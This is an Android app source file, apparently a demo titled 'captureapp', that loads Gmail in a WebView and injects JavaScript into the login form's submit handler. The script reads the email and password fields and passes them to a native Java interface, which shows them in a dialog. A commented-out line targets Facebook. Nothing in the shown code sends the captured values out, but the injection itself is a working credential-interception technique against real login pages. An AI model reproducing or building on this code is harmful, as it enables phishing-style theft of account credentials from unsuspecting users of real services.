package com.example.captureapp;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.DialogInterface;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;

import android.webkit.WebViewClient;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    /*@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        WebView myWebView = (WebView) findViewById(R.id.webview);
        myWebView.loadUrl("http://www.example.com");*/
    WebView webview;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webview = (WebView)findViewById(R.id.webView);
        webview.getSettings().setJavaScriptEnabled(true);
        webview.setWebChromeClient(new WebChromeClient());
        webview.addJavascriptInterface(new MyJavaScriptInterface(), "Android");
        webview.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }

            //@Override
            //public void onPageStarted(WebView view, String url,
              //                        Bitmap favicon) {
            //}
            /*--------
            Code below is adapted from
            https://stackoverflow.com/questions/49594974/webview-javascript-injection
            ------*/
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.e("MyJavascriptFinished", "Page Finished");
                StringBuilder sb = new StringBuilder();

                sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
                sb.append("var password=null; var email=null; var alertMessage = '';");
                sb.append("var inputs = document.getElementsByTagName('input');");

                sb.append("for (var i = 0; i < inputs.length; i++) {");
                sb.append("if (inputs[i].name.toLowerCase() === 'passwd') {password = inputs[i];}");
                sb.append("else if (inputs[i].name.toLowerCase() === 'identifier') {email = inputs[i];}");
                sb.append("}");
                sb.append("if (email != null) {alertMessage += 'Email: ' + email.value;}");
                sb.append("if (password != null) { alertMessage += ' Password: ' + password.value;}");

                sb.append("window.Android.processHTML(alertMessage);");

                sb.append("return true;");
                sb.append("};");

                Log.e("MyJavascriptFinished", sb.toString());
                view.loadUrl("javascript:" + sb.toString());
            }


        });
        webview.addJavascriptInterface(new MyJavaScriptInterface(), "Android");

        //String sUrl = "https://www.facebook.com/";
        String sUrl = "https://gmail.com";
        webview.loadUrl(sUrl);
        Log.e("MyJavascriptLoad","Page loaded");

    }
    class MyJavaScriptInterface
    {
        @JavascriptInterface
        public void processHTML(String html)
        {
            Log.e("MyJavascriptProcess", "PROCESSING");
            AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
            builder.setTitle("AlertDialog from app")
                    .setMessage(html)
                    .setPositiveButton(android.R.string.ok,
                            new DialogInterface.OnClickListener() {

                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    // TODO Auto-generated method stub

                                }

                            })
                    .setCancelable(false).show();

        }
    }
}